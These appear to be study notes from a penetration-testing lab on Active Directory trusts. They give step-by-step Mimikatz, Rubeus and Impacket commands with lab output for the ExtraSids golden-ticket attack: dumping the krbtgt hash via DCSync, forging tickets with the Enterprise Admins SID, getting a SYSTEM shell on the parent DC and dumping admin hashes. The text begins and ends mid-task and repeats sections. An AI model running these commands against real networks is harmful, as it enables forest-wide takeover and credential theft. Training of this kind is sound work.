                                → NT hash of child domain krbtgt
                                  = used to sign the forged ticket

-domain LOGISTICS.INLANEFREIGHT.LOCAL
                                → child domain FQDN
                                  = domain the fake user belongs to

-domain-sid S-1-5-21-2806153819-209893948-922872689
                                → SID of CHILD domain
                                  identifies the child domain

-extra-sid S-1-5-21-3842939050-3880317879-2865463114-519
                                → THE KEY PARAMETER
                                  Enterprise Admins SID from parent
                                  embedded in SID History of ticket
                                  = what gives us parent domain access

hacker                          → username for fake user in ticket
                                  last parameter, no flag needed
                                  = user does not need to exist

What you find:

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*] Saving ticket in hacker.ccache
                      ↑
= Ticket saved as hacker.ccache
= ccache = Linux Kerberos credential cache format
= Need to tell system to use this file
Task 20 - Set KRB5CCNAME and Use the Ticket
bash
# Tell Linux to use our forged ticket for Kerberos auth
export KRB5CCNAME=hacker.ccache

# Verify ticket with klist
klist

Breaking down:

export KRB5CCNAME=hacker.ccache → environment variable
                                  tells all Kerberos tools
                                  to use this ccache file
                                  for authentication
                                  = our forged ticket is now active
                                  = all -k requests use hacker's ticket
Task 21 - Get SYSTEM Shell on Parent Domain DC (psexec.py)
bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Breaking down:

psexec.py                       → Impacket tool for remote execution
                                  uploads executable, creates service
                                  gives interactive shell

LOGISTICS.INLANEFREIGHT.LOCAL/hacker
                                → domain/username = our fake user
                                  LOGISTICS = child domain
                                  hacker = fake user in our ticket

@academy-ea-dc01.inlanefreight.local
                                → target = PARENT domain DC hostname

-k                              → use Kerberos authentication
                                  = use our forged ticket from ccache
                                  = KRB5CCNAME environment variable

-no-pass                        → no password needed
                                  using Kerberos ticket instead

-target-ip 172.16.5.5          → IP of parent domain DC
                                  needed to connect to correct machine

What you find:

[*] Found writable share ADMIN$
[*] Uploading file nkYjGWDZ.exe
[*] Creating service on DC
[*] Starting service

Microsoft Windows [Version 10.0.17763.107]

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01

= SYSTEM shell on PARENT domain DC
= From child domain compromise
= Full forest compromise achieved
= Game over for entire AD environment
Task 22 - Automated Attack with raiseChild.py
bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

Breaking down:

raiseChild.py                   → Impacket automated child-to-parent attack
                                  does EVERYTHING automatically:
                                  1. Finds parent forest FQDN
                                  2. Gets Enterprise Admins SID
                                  3. Gets child krbtgt credentials
                                  4. Creates Golden Ticket
                                  5. Logs into parent domain
                                  6. Dumps parent admin credentials
                                  7. Gives SYSTEM shell

-target-exec 172.16.5.5        → target = parent domain DC IP
                                  where to launch SYSTEM shell

LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
                                → child domain admin credentials
                                  = what we start with

= ONE COMMAND = full forest compromise
= But understand manual method first!

What you find:

[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-...-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435...:9d765b4...:::
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435...:16e26ba3...:::
INLANEFREIGHT.LOCAL/administrator:500:aad3b435...:88ad0918...:::
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

C:\Windows\system32>whoami
nt authority\system

Why NOT to always use raiseChild.py:

raiseChild.py is convenient but:
→ If it fails you don't know why
→ You can't troubleshoot what went wrong
→ In production environments = could cause issues
→ Better to understand each step manually

Always learn the manual method FIRST
Use automated tools only when you understand
  what they are doing under the hood
If something breaks = you can fix it
If tool is blocked = you can do it manually
6. Complete Attack Chain Summary
STARTING POINT:
Compromised child domain admin account
htb-student_adm in LOGISTICS.INLANEFREIGHT.LOCAL

GOAL:
Compromise parent domain INLANEFREIGHT.LOCAL

FROM WINDOWS:

Step 1: DCSync child krbtgt
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
→ Get: 9d765b482771505cbe97411065964d5f

Step 2: Get child domain SID  
Get-DomainSID
→ Get: S-1-5-21-2806153819-209893948-922872689

Step 3: Get Enterprise Admins SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
→ Get: S-1-5-21-3842939050-3880317879-2865463114-519

Step 4: Create Golden Ticket with ExtraSids
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:[child_SID] /krbtgt:[krbtgt_hash] /sids:[EA_SID] /ptt

Step 5: Verify ticket in memory
klist

Step 6: Access parent domain
ls \\academy-ea-dc01.inlanefreight.local\c$

Step 7: DCSync parent domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator /domain:INLANEFREIGHT.LOCAL

FROM LINUX:

Step 1: DCSync child krbtgt
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Step 2: Get child domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Step 3: Get parent Enterprise Admins SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Step 4: Create Golden Ticket
ticketer.py -nthash [krbtgt_hash] -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid [child_SID] -extra-sid [EA_SID] hacker

Step 5: Activate ticket
export KRB5CCNAME=hacker.ccache

Step 6: Get SYSTEM shell on parent DC
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

OR automated:
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
7. Key Things to Remember
1. Trust enumeration = ALWAYS do this after initial foothold
   Get-ADTrust -Filter *
   Get-DomainTrust
   Get-DomainTrustMapping
   = Find all attack paths through trusts

2. IntraForest: True = child domain = ExtraSids possible
   ForestTransitive: True = forest trust = different attacks
   BiDirectional = can auth both ways = more attack paths

3. SID Filtering NOT applied within same forest
   = ExtraSids attack works within same forest
   = Child domain compromise = parent domain compromise
   = ALWAYS check for child-parent trust relationship

4. ExtraSids needs 5 pieces of data
   krbtgt hash (child) + child SID + fake username
   + child FQDN + Enterprise Admins SID (parent)
   = Missing any one = attack fails

5. Enterprise Admins RID is ALWAYS 519
   Parent_SID-519 = Enterprise Admins SID
   = Build the EA SID yourself from domain SID

6. Golden Ticket user does NOT need to exist
   /user:hacker = completely fake user
   Ticket is FORGED = user never needs to be real
   = No traces in AD user database

7. /ptt = inject to memory immediately
   Without /ptt = saves to .kirbi file
   Then use kerberos::ptt to inject later
   /ptt is easier for immediate use

8. KRB5CCNAME tells Linux which Kerberos ticket to use
   export KRB5CCNAME=filename.ccache
   All -k commands will use this ticket
   = Critical step or ticket won't be used

9. raiseChild.py = automated but learn manual first
   If it fails = you need to understand each step
   If it breaks production = you need to clean up
   Always prefer manual methods you understand fully

10. DCSync across domains needs /domain flag
    mimikatz # lsadump::dcsync /user:INLANEFREIGHT\admin
    /domain:INLANEFREIGHT.LOCAL  ← REQUIRED when cross-domain
    Without it = might target wrong DC = fails

Domain Trusts - Complete Detailed Notes
1. What Are Domain Trusts? (Simple Explanation)

A domain trust is a relationship between two domains that allows users from one domain to access resources in another domain. Think of it like a business partnership agreement between two companies. If Company A and Company B have a partnership agreement, employees of Company A can potentially visit Company B's offices and use their facilities, and vice versa depending on the agreement terms. In Active Directory, this means users in Domain A can potentially authenticate to Domain B and access resources there. Domain trusts are extremely important for penetration testers because they represent attack paths that often go overlooked by defenders. If we can compromise one domain in a trust relationship, we may be able to pivot through the trust to compromise other domains, sometimes including the main parent domain of an entire forest.

Real World Example of Why Trusts Matter:

Company acquires a smaller startup
IT team sets up trust to share resources
Startup's AD security is weak (startup culture)
Attacker finds vulnerability in startup domain
Compromises startup domain
Uses trust relationship to pivot into main company
= Main company domain compromised through "back door"

This is EXTREMELY common in real assessments
Trusts = attack paths defenders forget about
Always enumerate all trusts during assessments
2. Types of Domain Trusts
1. PARENT-CHILD Trust
   = Two domains in SAME forest
   Example:
   INLANEFREIGHT.LOCAL (parent)
   LOGISTICS.INLANEFREIGHT.LOCAL (child)

   Properties:
   → Always BIDIRECTIONAL
   → Always TRANSITIVE
   → Created automatically when child domain created
   → SID Filtering NOT applied within same forest
   → Child to Parent attack = ExtraSids attack possible

2. CROSS-LINK Trust
   = Between child domains at same level
   = Used to speed up authentication

3. EXTERNAL Trust
   = Two SEPARATE domains in DIFFERENT forests
   → NON-transitive by default
   → SID Filtering IS applied

4. TREE-ROOT Trust
   = New tree added to existing forest
   → Bidirectional, transitive

5. FOREST Trust
   = Between two DIFFERENT forests entirely
   Example: INLANEFREIGHT.LOCAL ↔ FREIGHTLOGISTICS.LOCAL
   → Can be bidirectional or one-way
   → SID Filtering applied by default
   → Bidirectional = cross-forest attack paths exist

6. ESAE (Enhanced Security Admin Environment)
   = Bastion/admin forest for managing AD
Transitive vs Non-Transitive
TRANSITIVE Trust:
If A trusts B and B trusts C
Then A AUTOMATICALLY trusts C too

NON-TRANSITIVE Trust:
A trusts B, B trusts C
A does NOT automatically trust C
= Each trust is isolated

Package Delivery Analogy:
Transitive = "Anyone in my household can accept packages for me"
Non-Transitive = "ONLY the FedEx driver and I can touch this package"
One-Way vs Bidirectional
ONE-WAY Trust:
Users in trusted domain can access resources in trusting domain
Authentication flows ONE direction only

BIDIRECTIONAL Trust:
Both domains trust each other equally
= Authentication flows both ways
= If we compromise one = can attack the other
3. Enumerating Domain Trusts
Task 1 - Using Built-in PowerShell (Get-ADTrust)
powershell
Import-Module activedirectory
Get-ADTrust -Filter *

Why we use Get-ADTrust:

Get-ADTrust is a BUILT-IN Windows cmdlet
→ No external tools needed
→ Works on any domain-joined machine
→ Uses the Active Directory PowerShell module
→ Gives us comprehensive trust information
→ Use this when PowerView is not available
→ Good for initial recon of trust relationships
→ Shows every property of every trust

Breaking down:

Import-Module activedirectory    → loads built-in AD module
Get-ADTrust                      → built-in cmdlet to query trusts
-Filter *                        → get ALL trusts, no filtering

What you find and what it means:

Trust 1:
Direction               : BiDirectional
IntraForest             : True      ← SAME forest = child domain
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ForestTransitive        : False     ← not a forest trust
SelectiveAuthentication : False     ← all users can auth
SIDFilteringQuarantined : False     ← SID filtering OFF = ExtraSids works

IntraForest True + SIDFiltering False = ExtraSids attack possible
BiDirectional = users can auth both ways
= Child to Parent escalation via ExtraSids

Trust 2:
Direction               : BiDirectional
ForestTransitive        : True      ← DIFFERENT forest = forest trust
Name                    : FREIGHTLOGISTICS.LOCAL
IntraForest             : False     ← different forest
SIDFilteringForestAware : False     ← some SID filtering may apply

ForestTransitive True = separate forest
BiDirectional = cross-forest attacks possible
= Kerberoasting across forest, enumeration possible
Task 2 - Using PowerView (Get-DomainTrust)
powershell
Import-Module .\PowerView.ps1
Get-DomainTrust

Why we use Get-DomainTrust:

Get-DomainTrust gives CLEANER output than Get-ADTrust
→ More readable format for quick assessment
→ Shows TrustAttributes in human readable form
  WITHIN_FOREST = same forest child domain
  FOREST_TRANSITIVE = external forest trust
→ Shows WhenCreated and WhenChanged dates
  Old trusts = might be forgotten = less secured
→ Good for understanding trust direction quickly
→ PowerView function = more attacker-friendly format
→ Part of standard pentesting toolkit

What you find:

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST    ← child domain same forest
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE ← external forest trust
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM
Task 3 - Map ALL Trust Relationships (Get-DomainTrustMapping)
powershell
Get-DomainTrustMapping

Why we use Get-DomainTrustMapping:

Get-DomainTrustMapping is MORE THOROUGH than Get-DomainTrust
→ Follows ALL trust chains recursively
→ Shows trusts from EVERY reachable domain
→ Not just from our current domain
→ Discovers trusts we might not see from our position
→ Gets complete picture of entire forest trust structure
→ Shows trusts from both sides of the relationship
→ Essential for finding hidden attack paths
→ Identifies all domains we might be able to pivot to

What you find:

SourceName: INLANEFREIGHT.LOCAL → LOGISTICS (as source)
SourceName: INLANEFREIGHT.LOCAL → FREIGHTLOGISTICS (as source)
SourceName: FREIGHTLOGISTICS.LOCAL → INLANEFREIGHT (from other side)
SourceName: LOGISTICS.INLANEFREIGHT.LOCAL → INLANEFREIGHT (from other side)

= COMPLETE picture from all perspectives
= Shows ALL reachable trust paths
= Use this to identify every possible attack path
= Essential for planning cross-trust attacks
Task 4 - Check Users in Child Domain
powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

Why we use this:

After finding a trust exists, enumerate what users are there
→ Find privileged accounts worth targeting
→ Find service accounts for Kerberoasting across trust
→ Understand the attack surface of trusted domain
→ -Domain parameter = query a DIFFERENT domain
   not just our current domain
→ Trust relationship allows this cross-domain enumeration
→ Shows us potential accounts to compromise
→ Look for admin accounts, service accounts

What you find:

samaccountname
--------------
htb-student_adm    ← admin account = valuable
Administrator
Guest
lab_adm            ← lab admin = valuable
krbtgt             ← krbtgt hash = needed for Golden Ticket
Task 5 - Using netdom (Built-in Windows Tool)
cmd
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation

Why we use netdom:

netdom is a BUILT-IN Windows command line tool
→ No PowerShell module needed
→ No external tools needed
→ Works even when PowerShell is restricted
→ Good for AppLocker bypass scenarios
→ Shows trusts, DCs, workstations all with same tool
→ Useful when you cannot use PowerShell at all
→ Simpler output than Get-ADTrust
→ Quick verification of trust existence

What you find:

Trust query:
<-> LOGISTICS.INLANEFREIGHT.LOCAL  Direct ← bidirectional trust
<-> FREIGHTLOGISTICS.LOCAL         Direct ← bidirectional trust

DC query:
ACADEMY-EA-DC01  ← the domain controller

Workstation query:
ACADEMY-EA-MS01, ACADEMY-EA-MX01, SQL01
= Full inventory of domain machines
= Know what to target for lateral movement
Task 6 - BloodHound Trust Visualization
Analysis tab → "Map Domain Trusts"
= Visual graph of all trust relationships
= Shows direction and type at a glance
= Most intuitive way to understand trust structure
PART 2: SID History and ExtraSids Attack - Background
4. What is SID History?

The sidHistory attribute was created for a very specific legitimate purpose — domain migrations. When a company migrates user accounts from an old domain to a new domain, a new account is created for the user in the new domain with a new SID. However, all the resources in the old domain still have ACLs that reference the OLD SID. Without SID History, the migrated user would lose access to all their old resources until every single ACL was updated which could take enormous effort. SID History solves this by storing the OLD SID in the new account so when the user authenticates, Windows sees all their SIDs including the historical ones and grants access to resources that reference the old SID. The critical security issue is that SID History works WITHIN the same forest without SID Filtering, and an attacker with Mimikatz can inject ANY SID into the SID History including the Enterprise Admins SID from the parent domain.

Legitimate Use:
Old Domain: user has SID S-1-5-21-OLD-1234
New Domain: user gets new SID S-1-5-21-NEW-5678
SID History: S-1-5-21-OLD-1234 stored in sidHistory
When user logs in to New Domain:
Token contains: NEW SID + OLD SID from history
Resources in Old Domain see OLD SID → grant access
= Seamless migration, no ACL changes needed

Attacker Abuse:
User in child domain has SID S-1-5-21-CHILD-1234
Attacker injects EA SID S-1-5-21-PARENT-519 into sidHistory
When user logs in:
Token contains: CHILD SID + EA SID from injected history
Parent domain sees Enterprise Admins SID in token
Parent domain grants Enterprise Admin access
= Child domain user gets parent domain admin rights
5. ExtraSids Attack Explained

The ExtraSids attack exploits the lack of SID Filtering within an AD forest. SID Filtering is a protection designed to strip out foreign SIDs from authentication requests. Critically, SID Filtering is NOT enabled between domains within the SAME forest because the assumption is that all domains in a forest are equally trusted. This means that when we create a Golden Ticket in the child domain and embed the Enterprise Admins SID in the Extra SIDs field, the parent domain DC will accept that SID as legitimate because it came from within the same forest. The result is that a user with this forged ticket is treated as an Enterprise Admin in the parent domain even though they are not actually a member of that group.

Why SID Filtering doesn't stop this:

Between DIFFERENT forests: SID Filtering IS enabled
= Foreign SIDs stripped out = ExtraSids doesn't work cross-forest

Within SAME forest: SID Filtering IS NOT enabled
= All SIDs accepted including injected ones
= Parent domain trusts all SIDs from child domain
= ExtraSids attack WORKS within same forest

The forest is the security boundary in AD
NOT the individual domain
= Compromising any domain in forest = compromise all
= This is by Microsoft design, not a bug
6. Data Required for ExtraSids Attack
Before attacking collect ALL five pieces:

1. KRBTGT hash for CHILD domain
   → krbtgt account in LOGISTICS.INLANEFREIGHT.LOCAL
   → Get via DCSync: 9d765b482771505cbe97411065964d5f
   → Used to SIGN the forged Golden Ticket
   → Without this = cannot create valid ticket

2. SID for CHILD domain
   → S-1-5-21-2806153819-209893948-922872689
   → Identifies WHICH domain the fake user is from
   → Without this = ticket has wrong domain info

3. Target username (DOES NOT need to exist)
   → We use "hacker" = completely fake user
   → Can be ANY name you want
   → Ticket is FORGED = user never needs to be real in AD
   → This is why it is so powerful = no account needed

4. FQDN of CHILD domain
   → LOGISTICS.INLANEFREIGHT.LOCAL
   → Domain the ticket appears to be from

5. SID of Enterprise Admins in PARENT domain
   → S-1-5-21-3842939050-3880317879-2865463114-519
   → Always ends in -519 (Enterprise Admins RID)
   → THIS is what gets embedded in SID History
   → THIS is what gives us parent domain access
PART 3: ExtraSids Attack From Windows
Task 7 - DCSync Child Domain krbtgt Hash
powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

What you find:

[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be DC

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
             ↑ SAVE THIS = krbtgt hash for child domain
             = Used to sign and forge the Golden Ticket
Task 8 - Get Child Domain SID
powershell
Get-DomainSID

What you find:

S-1-5-21-2806153819-209893948-922872689
↑ SAVE THIS = SID of LOGISTICS child domain
= Also visible in Mimikatz DCSync output above
Task 9 - Get Enterprise Admins SID from Parent Domain
powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

What you find:

distinguishedname                                        objectsid
-----------------                                        ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  S-1-5-21-3842939050-3880317879-2865463114-519
                                                                                                    ↑
                                                                                               RID 519
                                                                               = always Enterprise Admins
                                                                               SAVE THIS SID
Task 10 - Verify No Access to Parent Domain Yet
powershell
ls \\academy-ea-dc01.inlanefreight.local\c$

What you find:

ls : Access is denied
= Confirmed we cannot access parent domain DC yet
= Baseline to prove attack worked after
Task 11 - Create Golden Ticket with Mimikatz (ExtraSids)
powershell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

Breaking down every parameter:

kerberos::golden            → Mimikatz Golden Ticket module

/user:hacker                → username in the forged ticket
                              THIS USER DOES NOT NEED TO EXIST
                              completely fictional name

/domain:LOGISTICS.INLANEFREIGHT.LOCAL
                            → CHILD domain FQDN
                              where the fake user appears to be from

/sid:S-1-5-21-2806153819-209893948-922872689
                            → SID of CHILD domain
                              identifies the child domain

/krbtgt:9d765b482771505cbe97411065964d5f
                            → NT hash of krbtgt in CHILD domain
                              used to CRYPTOGRAPHICALLY SIGN the ticket
                              DC cannot tell it is forged
                              because it is signed with the real key

/sids:S-1-5-21-3842939050-3880317879-2865463114-519
                            → THE KEY PARAMETER = ExtraSids
                              Enterprise Admins SID embedded in ticket
                              goes into the SID History field
                              parent domain sees this SID
                              grants Enterprise Admin access
                              = the "extra" SID that crosses domain boundary

/ptt                        → Pass The Ticket = inject directly to memory
                              immediately usable
                              no need to save and load separately

What you find:

User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL
SID       : S-1-5-21-2806153819-209893948-922872689
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ← EA SID embedded

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' 
successfully submitted for current session
Task 12 - Verify Ticket is in Memory
powershell
klist

What you find:

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)    ← 10 YEARS validity
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

= Fake hacker user ticket confirmed in memory
= 10 years validity = long persistence
= forwardable renewable = can be used across network
= Ready to access parent domain resources
Task 13 - Access Parent Domain DC File System
powershell
ls \\academy-ea-dc01.inlanefreight.local\c$

What you find:

Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  PerfLogs
10/06/2021  Program Files
11/19/2021  Shares
10/06/2021  Users
03/21/2022  Windows

= SUCCESS = we can now browse the parent domain DC
= ExtraSids attack worked perfectly
= We have Enterprise Admin level access in parent domain
Task 14 - DCSync Against Parent Domain
powershell
# Open Mimikatz fresh
cd C:\Tools\mimikatz\x64
.\mimikatz.exe

# DCSync parent domain admin user
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

What you find:

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account

** SAM ACCOUNT **
SAM Username         : lab_adm
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
             ↑ NTLM hash for lab_adm in parent domain
             = Can use for Pass-the-Hash
             = lab_adm is a Domain Admin

When cross-domain add /domain flag:

powershell
# Must specify /domain when targeting different domain's DC
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

Why /domain is needed:

/domain:INLANEFREIGHT.LOCAL     → tells Mimikatz explicitly
                                  WHICH DC to contact for DCSync
                                  When you have cross-domain Golden Ticket
                                  Mimikatz might target wrong DC
                                  /domain ensures it targets PARENT DC
                                  = Critical for cross-domain operations
                                  = Without this might fail or target wrong DC
Task 15 - Alternative: Create Golden Ticket with Rubeus
powershell
# First verify we cannot access parent domain
ls \\academy-ea-dc01.inlanefreight.local\c$
# Should say Access is denied

# Create Golden Ticket using Rubeus
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

Breaking down differences from Mimikatz:

/rc4:9d765b482771505cbe97411065964d5f
                                → /rc4 = NT hash (Rubeus uses /rc4)
                                  Same value as Mimikatz /krbtgt
                                  Different parameter name only

/domain:LOGISTICS.INLANEFREIGHT.LOCAL
                                → child domain FQDN (same as Mimikatz)

/sid:S-1-5-21-2806153819-209893948-922872689
                                → child domain SID (same as Mimikatz)

/sids:S-1-5-21-3842939050-3880317879-2865463114-519
                                → Enterprise Admins extra SID
                                  same parameter name as Mimikatz
                                  = the key parameter for cross-domain

/user:hacker                    → fake username (same concept)

/ptt                            → inject ticket to memory immediately
                                  same as Mimikatz /ptt

Why use Rubeus instead of Mimikatz:
→ Rubeus is a compiled C# tool = harder for AV to detect
→ Rubeus gives cleaner formatted output
→ Rubeus is actively maintained
→ Both achieve the exact same result
→ Rubeus shows ticket details more clearly

What Rubeus outputs:

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
                     ↑ Enterprise Admins SID confirmed embedded

[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 3/29/2022 10:06:41 AM
[*] StartTime      : 3/29/2022 10:06:41 AM
[*] EndTime        : 3/29/2022 8:06:41 PM
[*] RenewTill      : 4/5/2022 10:06:41 AM

[*] base64(ticket.kirbi): [LONG BASE64 STRING]

[+] Ticket successfully imported!

Confirm ticket in memory after Rubeus:

powershell
klist

What you find:

Current LogonId is 0:0xf6495

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/29/2022 10:06:41 (local)
        End Time:   3/29/2022 20:06:41 (local)
        Renew Time: 4/5/2022 10:06:41 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

= Ticket from Rubeus confirmed in memory
= Same result as Mimikatz approach
= Ready to access parent domain resources

Then perform DCSync against parent domain:

powershell
# Mimikatz DCSync using the Rubeus ticket
.\mimikatz.exe
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

What you find:

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
= Same result as Mimikatz method
= Full parent domain compromise confirmed
PART 4: ExtraSids Attack From Linux
Task 16 - DCSync Child Domain krbtgt (secretsdump.py)
bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Breaking down:

secretsdump.py                  → Impacket DCSync tool

logistics.inlanefreight.local/htb-student_adm
                                → CHILD domain/admin username

@172.16.5.240                   → CHILD domain DC IP

-just-dc-user LOGISTICS/krbtgt → get ONLY the krbtgt hash
                                  LOGISTICS/ = child domain prefix

What you find:

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
                                              ↑ NTLM hash = SAVE THIS
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
Task 17 - Get Child Domain SID (lookupsid.py)
bash
# Full output to see all users and groups
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240

# Filter just the domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

What you find:

[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
= SID of LOGISTICS child domain = SAVE THIS
Task 18 - Get Enterprise Admins SID from Parent Domain
bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Breaking down:

@172.16.5.5                     → PARENT domain DC IP
                                  targeting parent domain this time

| grep -B12 "Enterprise Admins"→ show EA line + 12 lines before
                                  = shows parent domain SID AND EA entry

What you find:

[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
                   ↑ PARENT domain SID
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
     ↑ RID 519 = always Enterprise Admins

Build full EA SID:
S-1-5-21-3842939050-3880317879-2865463114 + -519
= S-1-5-21-3842939050-3880317879-2865463114-519
= Enterprise Admins SID = SAVE THIS
Task 19 - Create Golden Ticket with ticketer.py
bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

Breaking down:

ticketer.py                     → Impacket Golden Ticket tool
                                  Linux equivalent of Mimikatz golden

-nthash 9d765b482771505cbe97411065964d5f
                                → NT hash of child domain krbtgt

-domain LOGISTICS.INLANEFREIGHT.LOCAL
                                → child domain FQDN

-domain-sid S-1-5-21-2806153819-209893948-922872689
                                → SID of CHILD domain

-extra-sid S-1-5-21-3842939050-3880317879-2865463114-519
                                → THE KEY PARAMETER
                                  Enterprise Admins SID from parent
                                  = embedded in SID History of ticket

hacker                          → fake username, no flag needed
                                  user does not need to exist

What you find:

[*] Saving ticket in hacker.ccache
= Ticket saved as hacker.ccache file
= ccache = Linux Kerberos credential cache format
= Must tell system to use this file
Task 20 - Activate Ticket and Get SYSTEM Shell
bash
# Tell Linux to use our forged ticket
